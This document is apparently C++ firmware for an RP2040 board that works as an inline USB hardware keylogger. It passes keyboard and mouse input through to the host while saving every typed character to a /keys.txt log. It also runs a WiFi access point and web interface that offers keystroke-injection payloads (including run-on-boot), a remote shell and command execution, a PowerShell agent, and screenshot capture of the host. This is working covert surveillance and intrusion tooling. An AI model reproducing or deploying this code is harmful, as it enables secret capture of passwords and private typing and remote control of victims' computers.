#include <pico/stdlib.h>
#include <LittleFS.h> 
#include "pio_usb.h"
#include "Adafruit_TinyUSB.h"
#include <HIDKeyboard.h>
#include <WiFi.h>
#include <WebServer.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <functional>
#include "base64.h"
#include "setup.h"
#include "webfunctions.h"
#include "webfiles.h"
#include "screen.h"

// ======================================= Buffer Functions =============================================
void openLogFile() {
    File f = LittleFS.open("/keys.txt", "a");
    if (!f) {
        Serial.println("Error opening log file");
    }
}

void writeBufferedKey(char key) {
    if (!hasClearedStartup) {
        display.clearDisplay();
        display.setCursor(0, 0);
        display.display();
        hasClearedStartup = true;
        printout("[LOG] ");
    }
    if (lastPrintWasRoute) {
        printout("\n");
        lastPrintWasRoute = false;
        printout("[LOG] ");
    }    
    char str[2] = { key, '\0' };
    printout(str);
    if (bufferIndex < BUFFER_SIZE - 1) {
        keyBuffer[bufferIndex++] = key;
        lastKeyTime = millis(); 
    } else {
        flushBuffer();
    }
}

void flushBuffer() {
  File f = LittleFS.open("/keys.txt", "a");
    if (bufferIndex > 0 && f) {
        f.write((const uint8_t*)keyBuffer, bufferIndex);
        f.flush();
        bufferIndex = 0;
    }
}

void closeLogFile() {
    flushBuffer();
    File f = LittleFS.open("/keys.txt", "a");
    if (f) {
        f.close();
    }
}

void checkInactivity() {
    if (bufferIndex > 0 && (millis() - lastKeyTime > INACTIVITY_TIMEOUT_MS)) {
        flushBuffer();
    }
}

// ======================================= Serial Functions =============================================

void readLog() {
    File i = LittleFS.open("keys.txt", "r");
    delay(200);
    Serial.println("-------- LOGS ----------");
    if (i) {
      while (i.available()) {
        Serial.write(i.read());
      }
      i.close();
    }
    Serial.println("\n------------------------");
    Serial.println("\n");
}

void clearLog() {
    File i = LittleFS.open("keys.txt", "w");
    delay(2000);
    if (i) {
      i.write("");
      Serial.println("Log File Deleted: DONE");
      i.close();
    }
}

void formatFS() {
    delay(2000);
    LittleFS.format();
    Serial.println("Formatted FS : DONE");
}

// ======================================= Main Setup and Loop =============================================
void setup() {
    Serial.begin(115200);
    LittleFS.begin();
    delay(1000);
    checkBootPayloads();   
    loadWiFiSettings();
    bool wifiEnabled = loadWiFiState();
    if (wifiEnabled) {
        WiFi.softAP(ssid.c_str(), password.c_str());
        Serial.print("WiFi AP Started. Connect to: \n\tWiFi Name: " + String(ssid) + "\n\tPassword: " + String(password) + "\n\tWeb Interface: http://");// http://" + String(apip));
        Serial.print(WiFi.softAPIP());
        Serial.print("\n");
    } else {
        Serial.println("WiFi is disabled. Use 'wifion' to enable.");
    }
    LittleFS.mkdir("/payloads");
    server.on("/payloads", HTTP_GET, handlePayloadsPage);
    server.on("/list_payloads", HTTP_GET, listPayloads);
    routeWithLog("/save_payload", HTTP_POST, savePayload, "[SVR] Payload Saved");
    routeWithLog("/delete_payload", HTTP_POST, deletePayload, "[SVR] Payload Deleted");
    server.on("/get-payload", HTTP_GET, handleGetPayload);
    routeWithLog("/run_payload", HTTP_POST, runPayload, "[SVR] Running Payload");
    server.on("/", HTTP_GET, handleRoot);  
    routeWithLog("/clear", HTTP_POST, handleClearLogs, "[SVR] Logs Cleared");
    routeWithLog("/toggle_payload_boot", HTTP_POST, handleTogglePayloadOnBoot, "[SVR] POB Toggled");
    server.on("/list_boot_payloads", HTTP_GET, handleListBootPayloads);
    server.on("/settings", HTTP_GET, handleSettingsPage);
    routeWithLog("/save_settings", HTTP_POST, handleSaveSettings, "[SVR] Settings Saved");
    server.on("/load_settings", HTTP_GET, handleLoadSettings);
    routeWithLog("/format_littlefs", HTTP_POST, handleFormatLittleFS, "[SVR] FS Formatted");
    server.on("/keyboard", HTTP_GET, handleKeyboardPage);
    server.on("/keypress", HTTP_POST, handleKeyPress);
    server.on("/shell", HTTP_GET, handleShell);
    routeWithLog("/execute", HTTP_POST, handleExecuteCommand, "[SVR] Command Executed");
    routeWithLog("/deploy", HTTP_POST, handlePsAgent, "[SVR] PS Agent Started");
    server.on("/screen", HTTP_GET, handleScreenPage);
    routeWithLog("/take-screenshot", HTTP_POST, handleTakeScreenshot, "[SVR] Screenshot");
    server.on("/get-screenshot", HTTP_GET, handleGetScreenshot);
    routeWithLog("/deploy-screenshot", HTTP_POST, handleSSAgent, "[SVR] SS Agent Started");
    server.on("/screenshot.jpg", HTTP_GET, handleSavedScreenshot);
    routeWithLog("/exit-agent", HTTP_POST, handleExitAgent, "[SVR] Exiting Agent");

    server.begin();
    Serial.println("HTTP Server Started.");
    
    #if RST_PIN >= 0
      display.begin(SSD1306_SWITCHCAPVCC, I2C_ADDRESS, RST_PIN);
    #else
      display.begin(SSD1306_SWITCHCAPVCC, I2C_ADDRESS);
    #endif   
    showStartupScreen(ssid, password);
}

void loop() { 
    if (Serial.available()) {
        String command = Serial.readStringUntil('\n');
        command.trim();       
        if (command.startsWith("ssid ")) {
            changeSSID(command.substring(5));
        } else if (command.startsWith("password ")) {
            changePassword(command.substring(9));
        } else if (command == "read") {
            readLog();
        } else if (command == "clear") {
            clearLog();
        } else if (command == "format") {
            formatFS();
        } else if (command == "wifion") {
            WiFi.softAP(ssid.c_str(), password.c_str());
            Serial.println("WiFi enabled.");
            saveWiFiState(true);
        } else if (command == "wifioff") {
            WiFi.softAPdisconnect(true);
            Serial.println("WiFi disabled.");
            saveWiFiState(false);
        }
    }   
    server.handleClient();
    checkInactivity();
    readSerialScreenshot();
}

void setup1() {
    Keyboard.begin();
    Mouse.begin();  
    uint32_t cpu_hz = clock_get_hz(clk_sys);
    if ( cpu_hz != 120000000UL && cpu_hz != 240000000UL ) {
      Serial.printf("Error: CPU Clock = %u, PIO USB require CPU clock must be multiple of 120 Mhz\r\n", cpu_hz);
      Serial.printf("Change your CPU Clock to either 120 or 240 Mhz in Menu->CPU Speed \r\n", cpu_hz);
    }
    pio_usb_configuration_t pio_cfg = PIO_USB_DEFAULT_CONFIG;
    pio_cfg.pin_dp = HOST_PIN_DP;
    USBHost.configure_pio_usb(1, &pio_cfg);
    USBHost.begin(1);
}

void loop1() {
    USBHost.task();
}

void routeWithLog(const char* path, HTTPMethod method, std::function<void()> handler, const char* message) {
    server.on(path, method, [handler, message]() {
        if (!hasClearedStartup) {
            display.clearDisplay();
            display.setCursor(0, 0);
            display.display();
            hasClearedStartup = true;
        }
        printout("\n");
        printout(message);
        lastPrintWasRoute = true;
        handler();
    });
}

// ======================================= Setup Host Keyboard =============================================
void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
    if ( !tuh_hid_receive_report(dev_addr, idx) ) {
      Serial.printf("Error: cannot request to receive report\r\n");
    }  
}

void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* report, uint16_t len) {
    static bool reportPending = false; 
    if (!reportPending) {
        uint8_t const itf_protocol = tuh_hid_interface_protocol(dev_addr, idx);
        if (itf_protocol == HID_ITF_PROTOCOL_KEYBOARD) {
            process_boot_kbd_report((hid_keyboard_report_t const*)report);
        }
        if (itf_protocol == HID_ITF_PROTOCOL_MOUSE) {
            process_boot_mouse_report( (hid_mouse_report_t const*) report );
        }      
        reportPending = true;
        tuh_hid_receive_report(dev_addr, idx);
        reportPending = false;
    }
}

void process_boot_mouse_report(hid_mouse_report_t const * report) { 
  hid_mouse_report_t prev_report = { 0 };
  uint8_t button_changed_mask = report->buttons ^ prev_report.buttons;
  if ( button_changed_mask & report->buttons) {
    if(report->buttons & MOUSE_BUTTON_LEFT) {
      Mouse.press(MOUSE_LEFT);
      delay(100);
      Mouse.release(MOUSE_ALL);
    }
    else if(report->buttons & MOUSE_BUTTON_RIGHT) {
      Mouse.press(MOUSE_RIGHT); 
      delay(100);
      Mouse.release(MOUSE_ALL);
    }
    else if(report->buttons & MOUSE_BUTTON_MIDDLE) {
      Mouse.press(MOUSE_MIDDLE);
      delay(100);
      Mouse.release(MOUSE_ALL);
    }
  } 
  int8_t x; int8_t y; int8_t wheel;
  Mouse.move(report->x, report->y, report->wheel);
}

void SetModifiersArd(void) {
  modifiersard=0;
  if(mod == 2) modifiersard = SHIFT;
  if(mod == 64) modifiersard = ALTGR;
};

void ProcessKeys(void) {
  
  if (key == KEY_RETURN) {
    Keyboard.write('\n');
  }
  else if (key == 82) {
    Keyboard.press(KEY_UP_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 81) {
    Keyboard.press(KEY_DOWN_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 80) {
    Keyboard.press(KEY_LEFT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 79) {
    Keyboard.press(KEY_RIGHT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 41) {
    Keyboard.press(KEY_ESC); delay(100);Keyboard.releaseAll();
  }
  else if (key == 73) {
    Keyboard.press(KEY_INSERT); delay(100);Keyboard.releaseAll();
  }
  else if (key == 77) {
    Keyboard.press(KEY_END); delay(100);Keyboard.releaseAll();
  }
  else if (key == 57) {
    Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
  }
  else if (key == 70) {
    Keyboard.press(KEY_PRINT_SCREEN); delay(100);Keyboard.releaseAll();
  }
  else if (key == 58) {
    Keyboard.press(KEY_F1); delay(100);Keyboard.releaseAll();
  }
  else if (key == 59) {
    Keyboard.press(KEY_F2); delay(100);Keyboard.releaseAll();
  }
  else if (key == 60) {
    Keyboard.press(KEY_F3); delay(100);Keyboard.releaseAll();
  }
  else if (key == 61) {
    Keyboard.press(KEY_F4); delay(100);Keyboard.releaseAll();
  }
  else if (key == 62) {
    Keyboard.press(KEY_F5); delay(100);Keyboard.releaseAll();
  }
  else if (key == 63) {
    Keyboard.press(KEY_F6); delay(100);Keyboard.releaseAll();
  }
  else if (key == 64) {
    Keyboard.press(KEY_F7); delay(100);Keyboard.releaseAll();
  }
  else if (key == 65) {
    Keyboard.press(KEY_F8); delay(100);Keyboard.releaseAll();
  }
  else if (key == 66) {
    Keyboard.press(KEY_F9); delay(100);Keyboard.releaseAll();
  }
  else if (key == 67) {
    Keyboard.press(KEY_F10); delay(100);Keyboard.releaseAll();
  }
  else if (key == 68) {
    Keyboard.press(KEY_F11); delay(100);Keyboard.releaseAll();
  }
  else if (key == 69) {
    Keyboard.press(KEY_F12); delay(100);Keyboard.releaseAll();
  }
  else if (key == 43) {
    Keyboard.press(KEY_TAB); delay(100);Keyboard.releaseAll();
  }
  else if (key == 42) {
    Keyboard.press(KEY_BACKSPACE); delay(100);Keyboard.releaseAll();
  }
}


// ======================================= Process Keystrokes =============================================

void process_boot_kbd_report(hid_keyboard_report_t const *report) {
    static hid_keyboard_report_t prev_report = { 0, 0, {0} };
    static bool prev_modifier_state = false;
    static bool modifier_changed = false;
    static uint8_t last_pressed_keys[6] = {0};
    if(report->modifier) {
      for(uint8_t i=0; i<6; i++) {
        key = report->keycode[i];
      }
      mod = report->modifier;
      if(key == 0 && mod == 8) {
        Keyboard.press(KEY_LEFT_GUI);
      }
    }
    
    bool current_modifier_state = (report->modifier != 0);
    if (current_modifier_state != prev_modifier_state) {
        if (current_modifier_state) {
            mod = report->modifier;
            modifier_changed = true;
        } else {
            delay(100);
            Keyboard.releaseAll();
            modifier_changed = true;
            mod = 0;
        }
        prev_modifier_state = current_modifier_state;
    }
    
    for (uint8_t i = 0; i < 6; i++) {
        uint8_t key = report->keycode[i];
        if (key) {
            bool already_pressed = false;
            for (uint8_t j = 0; j < 6; j++) {
                if (last_pressed_keys[j] == key) {
                    already_pressed = true;
                    break;
                }
            }           
            if (!already_pressed) {
                SetModifiersArd();
                key_modifier_layout = key | modifiersard;
                
                for (int i = 0; i < 128; i++) {
                    uint8_t mappedValue = pgm_read_byte(_asciimap + i);
                    
                    if (mappedValue == key_modifier_layout) {
                        char loggedChar = (char)i;
                        bool shiftActive = (mod & MODIFIERKEY_LEFT_SHIFT) || (mod & MODIFIERKEY_RIGHT_SHIFT);
                
                        if (shiftActive && loggedChar >= 'a' && loggedChar <= 'z') {
                            loggedChar = loggedChar - 'a' + 'A';
                        }
                        if (shiftActive) {
                            switch (loggedChar) {
                                case '1': loggedChar = '!'; break;
                                case '2': loggedChar = '@'; break;
                                case '3': loggedChar = '#'; break;
                                case '4': loggedChar = '$'; break;
                                case '5': loggedChar = '%'; break;
                                case '6': loggedChar = '^'; break;
                                case '7': loggedChar = '&'; break;
                                case '8': loggedChar = '*'; break;
                                case '9': loggedChar = '('; break;
                                case '0': loggedChar = ')'; break;
                                case '-': loggedChar = '_'; break;
                                case '=': loggedChar = '+'; break;
                                case '[': loggedChar = '{'; break;
                                case ']': loggedChar = '}'; break;
                                case '\\': loggedChar = '|'; break;
                                case ';': loggedChar = ':'; break;
                                case '\'': loggedChar = '\"'; break;
                                case ',': loggedChar = '<'; break;
                                case '.': loggedChar = '>'; break;
                                case '/': loggedChar = '?'; break;
                            }
                        }
                        writeBufferedKey(loggedChar);
                    }
                } 
                Keyboard.rawpress(key, mod);
            }
        }
    }   
    for (uint8_t i = 0; i < 6; i++) {
        bool still_pressed = false;
        for (uint8_t j = 0; j < 6; j++) {
            if (report->keycode[j] == last_pressed_keys[i]) {
                still_pressed = true;
                break;
            }
        }       
        if (!still_pressed && last_pressed_keys[i]) {
            Keyboard.rawrelease(last_pressed_keys[i], mod);
        }
    }   
    memcpy(last_pressed_keys, report->keycode, 6);
}
